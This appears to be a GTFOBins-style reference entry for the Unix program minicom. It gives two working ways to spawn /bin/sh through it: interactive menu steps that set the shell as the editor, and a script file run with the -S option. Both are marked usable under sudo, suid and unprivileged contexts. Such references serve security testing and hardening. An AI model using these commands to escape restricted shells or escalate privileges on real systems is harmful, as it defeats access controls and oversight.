---
type: gtfobin
name: minicom
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# minicom

## shell

```bash
minicom -D /dev/null
```
_Start the following command to open the TUI interface, then:

1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.

After the shell, exit with `Ctrl-A x`._
**Contexts:** sudo, suid, unprivileged

```bash
echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
minicom -D /dev/null -S /path/to/temp-file
reset^J
```
_After the shell, exit with `Ctrl-A x`._
**Contexts:** sudo, suid, unprivileged
